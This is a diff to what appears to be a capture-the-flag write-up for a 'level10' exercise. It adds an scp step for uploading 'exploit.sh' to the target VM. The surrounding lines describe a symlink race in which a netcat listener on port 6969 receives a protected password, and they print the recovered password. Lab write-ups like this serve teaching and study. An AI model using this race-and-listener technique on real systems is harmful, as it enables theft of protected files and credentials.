@@ -9,6 +9,7 @@ create a symlink to a dummy file with permissions :
 ```echo "exploit" > /tmp/dummy```
 ```ln -s /tmp/dummy /tmp/link```
 
+copy the exploit with ```scp -P 4242 exploit.sh level10@[VM_IP]:/tmp```
 we ready the server with ```nc -l 6969``` and we launch the exploit "exploit.sh". The exploit change the symlink after 0.1s and the server receives the password : woupa2yuojeeaaed06riuj63c
 
 
